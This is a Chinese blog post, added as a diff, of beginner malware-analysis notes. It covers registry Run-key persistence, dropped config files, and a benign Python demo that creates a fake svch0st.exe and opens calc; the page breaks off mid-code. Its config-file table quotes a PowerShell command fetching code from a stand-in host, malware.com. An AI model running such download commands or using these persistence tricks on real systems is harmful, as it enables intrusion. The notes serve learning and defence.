@@ -1,0 +1,372 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>0基础入门病毒学习笔记 | G00DBrain blog</title><meta name="author" content="GoodBrain"><meta name="copyright" content="GoodBrain"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0基础入门病毒学习笔记前言 这篇文章主要是笔者作为一个小白第一次开始了解病毒逆向做的笔记，打算跟着52破解的 定向财务的钓鱼木马分析这篇文章来，先将木马的启动流程走一遍，由于没有找到原木马文件，我也只能先云分析，之后自己写一个简单的木马来模拟攻击者 病毒检测如果我们遇见一个木马软件，要执行的操作是什么呢，没错就是判断他是不是一个病毒，你可以选择自己分析，使用逆向工具在虚拟机或者沙盒中一步一步对病毒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0基础入门病毒学习笔记">
+<meta property="og:url" content="http://example.com/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="G00DBrain blog">
+<meta property="og:description" content="0基础入门病毒学习笔记前言 这篇文章主要是笔者作为一个小白第一次开始了解病毒逆向做的笔记，打算跟着52破解的 定向财务的钓鱼木马分析这篇文章来，先将木马的启动流程走一遍，由于没有找到原木马文件，我也只能先云分析，之后自己写一个简单的木马来模拟攻击者 病毒检测如果我们遇见一个木马软件，要执行的操作是什么呢，没错就是判断他是不是一个病毒，你可以选择自己分析，使用逆向工具在虚拟机或者沙盒中一步一步对病毒">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg">
+<meta property="article:published_time" content="2025-06-15T05:29:40.000Z">
+<meta property="article:modified_time" content="2025-06-15T05:32:51.034Z">
+<meta property="article:author" content="GoodBrain">
+<meta property="article:tag" content="木马">
+<meta property="article:tag" content="病毒">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "0基础入门病毒学习笔记",
+  "url": "http://example.com/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
+  "image": "https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg",
+  "datePublished": "2025-06-15T05:29:40.000Z",
+  "dateModified": "2025-06-15T05:32:51.034Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "GoodBrain",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg"><link rel="canonical" href="http://example.com/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '0基础入门病毒学习笔记',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">G00DBrain blog</span></a><a class="nav-page-title" href="/"><span class="site-name">0基础入门病毒学习笔记</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">0基础入门病毒学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-15T05:29:40.000Z" title="发表于 2025-06-15 13:29:40">2025-06-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-15T05:32:51.034Z" title="更新于 2025-06-15 13:32:51">2025-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/re/">re</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="0基础入门病毒学习笔记"><a href="#0基础入门病毒学习笔记" class="headerlink" title="0基础入门病毒学习笔记"></a>0基础入门病毒学习笔记</h1><p><strong>前言</strong></p>
+<p>这篇文章主要是笔者作为一个小白第一次开始了解病毒逆向做的笔记，打算跟着52破解的 <strong>定向财务的钓鱼木马分析</strong>这篇文章来，先将木马的启动流程走一遍，由于没有找到原木马文件，我也只能先云分析，之后自己写一个简单的木马来模拟攻击者</p>
+<h2 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h2><p>如果我们遇见一个木马软件，要执行的操作是什么呢，没错就是判断他是不是一个病毒，你可以选择自己分析，使用逆向工具在虚拟机或者沙盒中一步一步对病毒进行分析，观察他有没有对系统进行什么敏感的操作，当然我们也可以使用一些检测沙盒比如<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">VirusTotal - 主页</a>快速的对软件的安全性进行检测</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611185822899.png" alt="image-20250611185822899"></p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>那么我们开始分析</p>
+<p>病毒执行流程总览</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611185037490.png" alt="image-20250611185037490"></p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>文件的开始都是从一个双击开始的，当你面对一个可疑文件没有任何检测的双击便是悲剧的开场</p>
+<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>了解持久化之前我们要先了解一个东西叫做注册表</p>
+<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>注册表是 Windows 操作系统中一个重要的数据库，用于存储系统和应用程序的配置信息、设置、选项以及其他必要的数据。它就像是系统的 “中央配置仓库”，记录着几乎所有软件和硬件的相关信息，确保系统和程序能够正常运行</p>
+<p>注册表采用类似文件系统的 “树形结构”，由以下 5 个主要根键（Hive）组成，每个根键下包含多个子键和值项：</p>
+<table>
+<thead>
+<tr>
+<th>根键名称</th>
+<th>作用描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HKEY_LOCAL_MACHINE (HKLM)</strong></td>
+<td>存储计算机的硬件和软件的系统级配置，对所有用户生效。</td>
+</tr>
+<tr>
+<td><strong>HKEY_CURRENT_USER (HKCU)</strong></td>
+<td>存储当前登录用户的个性化设置，如桌面偏好、应用程序配置等。</td>
+</tr>
+<tr>
+<td><strong>HKEY_CLASSES_ROOT (HKCR)</strong></td>
+<td>管理文件类型关联（如.docx 对应 Word 程序）和 COM 组件注册信息。</td>
+</tr>
+<tr>
+<td><strong>HKEY_CURRENT_CONFIG (HKCC)</strong></td>
+<td>存储当前硬件配置文件的信息，如显示器分辨率、打印机设置等。</td>
+</tr>
+<tr>
+<td><strong>HKEY_USERS (HKU)</strong></td>
+<td>包含所有用户账户的配置信息，HKCU 本质上是 HKU 下某个用户配置的快捷方式。</td>
+</tr>
+</tbody></table>
+<p>系统启动项</p>
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run：当前用户的启动项<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run：所有用户的启动项<br>这里我们只是简单了解，以后再深入，我们明白病毒通过注册表能实现开机自启等功能就行了</p>
+<p>参考文章中是使用ida动态查找到的注册表信息</p>
+<h3 id="释放配置文件"><a href="#释放配置文件" class="headerlink" title="释放配置文件"></a>释放配置文件</h3><p>生成并释放配置文件包含控制程序所需要的配置</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>技术特征</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>文本配置文件</strong>（<code>.ini</code> <code>.cfg</code> <code>.txt</code>）</td>
+<td>以明文或简单加密存储参数，可直接用记事本查看 例：<code>[Server] Host=hacker.com Port=8080</code></td>
+<td>存储网络通信参数、模块加载路径</td>
+</tr>
+<tr>
+<td><strong>二进制配置文件</strong>（<code>.dat</code> <code>.bin</code> <code>.tmp</code>）</td>
+<td>包含 PE 文件片段、加密数据或编译后的指令 需用 Hex 编辑器查看 16 进制数据</td>
+<td>存储恶意代码本体、加密密钥</td>
+</tr>
+<tr>
+<td><strong>脚本配置文件</strong>（<code>.ps1</code> <code>.bat</code> <code>.vbs</code>）</td>
+<td>包含可执行脚本指令 例：<code>powershell -c &quot;Invoke-WebRequest http://malware.com/install&quot;</code></td>
+<td>执行下载、文件修改等操作</td>
+</tr>
+<tr>
+<td><strong>注册表配置</strong>（通过注册表项存储）</td>
+<td>利用注册表键值存储配置信息 例：<code>HKEY_CURRENT_USER\Software\AppData\Config</code> 存储启动路径</td>
+<td>实现系统级持久化配置</td>
+</tr>
+</tbody></table>
+<h3 id="释放控制程序"><a href="#释放控制程序" class="headerlink" title="释放控制程序"></a>释放控制程序</h3><p>在于配置文件相同的目录下释放控制文件</p>
+<h3 id="执行控制程序"><a href="#执行控制程序" class="headerlink" title="执行控制程序"></a>执行控制程序</h3><p>执行刚刚释放的控制程序，使用<code>-Unpack-logDir&quot;C:\Users\username\AppData\Local\Temp\AgentInstall&quot;-v&quot;4.85.414.0&quot;</code>创建进程，安装IP-gurrd程序</p>
+<p><strong>IP-gurrd</strong></p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611202424387.png" alt="image-20250611202424387"></p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611202509703.png" alt="image-20250611202509703"></p>
+<h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>删除配置文件和控制程序</p>
+<h3 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h3><p>木马在执行的过程中，执行了权限位置，确保开机自启监控程序，配置文件和控制程序更多的想是一个安装程序，实现了监控程序的安装，而最终会删除安装程序，形象的比喻的话就像是装有间谍的木马被带进城（双击），夜深人静时，间谍从木马中出来（释放配置文件和释放控制程序），并藏在城中，最后木马离开（清除痕迹），就这那样城中被带进了一只眼睛监控所有人</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>推荐文章<a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024570&extra=page=1&filter=typeid&typeid=62">【逆向复现】PyInstaller简单复现 - 吾爱破解 - 52pojie.cn</a>标题简单，内容不简单，对入门的我而言受益匪浅</p>
+<p>工具总结</p>
+<p>pycdc：<a target="_blank" rel="noopener" href="https://github.com/zrax/pycdc">https://github.com/zrax/pycdc</a> 将pyc文件转为py</p>
+<p>pyarmor：<a target="_blank" rel="noopener" href="https://pyarmor.readthedocs.io/en/latest/%E6%B7%B7%E6%B7%86py%E4%BB%A3%E7%A0%81">https://pyarmor.readthedocs.io/en/latest/混淆py代码</a></p>
+<p>pyarmor-unpcker：<a target="_blank" rel="noopener" href="https://github.com/Svenskithesource/PyArmor-Unpacker">https://github.com/Svenskithesource/PyArmor-Unpacker</a> 解混淆py代码</p>
+<p>pyarmor-tooling：<a target="_blank" rel="noopener" href="https://github.com/GDATAAdvancedAnalytics/Pyarmor-Tooling%E8%A7%A3%E6%B7%B7%E6%B7%86py%E4%BB%A3%E7%A0%81">https://github.com/GDATAAdvancedAnalytics/Pyarmor-Tooling解混淆py代码</a></p>
+<p>pyinstxtractor：<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor%E5%B0%86exe%E8%BD%ACpyc">https://github.com/extremecoders-re/pyinstxtractor将exe转pyc</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=1029819">LovenSar</a>师傅的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># Import required modules for OS operations and subprocess management</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    &quot;&quot;&quot;Execute command and return (stdout, stderr, returncode)&quot;&quot;&quot;</span><br><span class="line">    # Create a new process to execute the command via cmd.exe</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, command],  # Command execution through cmd interpreter</span><br><span class="line">        shell=True,  # Enable shell execution environment</span><br><span class="line">        stdout=subprocess.PIPE,  # Capture standard output</span><br><span class="line">        stderr=subprocess.PIPE,  # Capture error output</span><br><span class="line">        universal_newlines=True  # Use universal newline decoding</span><br><span class="line">    )</span><br><span class="line">    try:</span><br><span class="line">        # Wait for process completion with 5-second timeout</span><br><span class="line">        stdout, stderr = process.communicate(timeout=5)</span><br><span class="line">        return stdout, stderr, process.returncode</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        # Terminate process if timeout occurs</span><br><span class="line">        process.kill()</span><br><span class="line">        return &quot;&quot;, &quot;Command timeout&quot;, -1</span><br><span class="line"></span><br><span class="line"># Create minimal PE file stub in C:\ (requires admin privileges)</span><br><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br><span class="line"># Execute file creation command and capture results</span><br><span class="line">stdout, stderr, code = execute_command(create_file_cmd)</span><br><span class="line"></span><br><span class="line"># Verify file creation success/failure</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;File creation succeeded&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;File creation failed: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Command to launch Windows calculator</span><br><span class="line">launch_calc_cmd = &#x27;calc.exe&#x27;</span><br><span class="line"># Execute calculator launch command</span><br><span class="line">stdout, stderr, code = execute_command(launch_calc_cmd)</span><br><span class="line"></span><br><span class="line"># Verify calculator launch success/failure</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;Calculator launched successfully&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;Calculator launch failed: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Test command execution using subprocess.run()</span><br><span class="line">test_command = &#x27;echo Hello Python!&#x27;</span><br><span class="line">result = subprocess.run(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, test_command],  # Command list for execution</span><br><span class="line">    shell=True,  # Maintain shell context</span><br><span class="line">    capture_output=True,  # Capture both stdout/stderr</span><br><span class="line">    text=True  # Return output as string instead of bytes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Check test command execution status</span><br><span class="line">if result.returncode == 0:</span><br><span class="line">    print(&quot;Test command succeeded&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;Test command failed: &#123;result.stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Optional cleanup command (disabled by default)</span><br><span class="line"># os.remove(&quot;C:\\svch0st.exe&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    &quot;&quot;&quot;执行命令并返回(标准输出, 错误输出, 返回码)&quot;&quot;&quot;</span><br><span class="line">    # 创建新进程通过cmd.exe执行命令</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, command],  # 通过cmd解释器执行命令</span><br><span class="line">        shell=True,  # 启用shell执行环境</span><br><span class="line">        stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        universal_newlines=True  # 使用通用换行符解码</span><br><span class="line">    )</span><br><span class="line">    try:</span><br><span class="line">        # 等待进程完成，设置5秒超时</span><br><span class="line">        stdout, stderr = process.communicate(timeout=5)</span><br><span class="line">        return stdout, stderr, process.returncode</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        # 超时则终止进程</span><br><span class="line">        process.kill()</span><br><span class="line">        return &quot;&quot;, &quot;命令执行超时&quot;, -1</span><br><span class="line"></span><br><span class="line"># 在C:\创建最小PE文件存根(需要管理员权限)</span><br><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br><span class="line"># 执行文件创建命令并捕获结果</span><br><span class="line">stdout, stderr, code = execute_command(create_file_cmd)</span><br><span class="line"></span><br><span class="line"># 验证文件创建成功/失败</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;文件创建成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;文件创建失败: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 启动Windows计算器的命令</span><br><span class="line">launch_calc_cmd = &#x27;calc.exe&#x27;</span><br><span class="line"># 执行计算器启动命令</span><br><span class="line">stdout, stderr, code = execute_command(launch_calc_cmd)</span><br><span class="line"></span><br><span class="line"># 验证计算器启动成功/失败</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;计算器启动成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;计算器启动失败: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 使用subprocess.run()测试命令执行</span><br><span class="line">test_command = &#x27;echo Hello Python!&#x27;</span><br><span class="line">result = subprocess.run(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, test_command],  # 要执行的命令列表</span><br><span class="line">    shell=True,  # 保持shell上下文</span><br><span class="line">    capture_output=True,  # 捕获标准输出和错误输出</span><br><span class="line">    text=True  # 以字符串而非字节形式返回输出</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 检查测试命令执行状态</span><br><span class="line">if result.returncode == 0:</span><br><span class="line">    print(&quot;测试命令执行成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;测试命令执行失败: &#123;result.stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 可选的清理命令(默认禁用)</span><br><span class="line"># os.remove(&quot;C:\\svch0st.exe&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="开始-1"><a href="#开始-1" class="headerlink" title="开始"></a>开始</h3><p>在认真研读完<a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=1029819">LovenSar</a>师傅的代码后我决定模拟一个攻击者来一遍攻击者的心路，未知攻焉知防</p>
+<h3 id="打开终端"><a href="#打开终端" class="headerlink" title="打开终端"></a>打开终端</h3><p>在python中打开终端需要开启一个子进程，使用subprocess库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;,&#x27;ipconfig&#x27;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这是一条最简单的打开终端并执行的代码，打开终端执行ipconfig退出</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611215507770.png" alt="image-20250611215507770"></p>
+<p><strong>process的全部参数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"># 创建子进程执行命令</span><br><span class="line">process = subprocess.Popen(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, &#x27;ipconfig&#x27;],  # 命令参数列表</span><br><span class="line">    # 其他可选参数：</span><br><span class="line">    # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">    # stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">    # shell=True,              # 是否使用shell执行</span><br><span class="line">    # cwd=None,                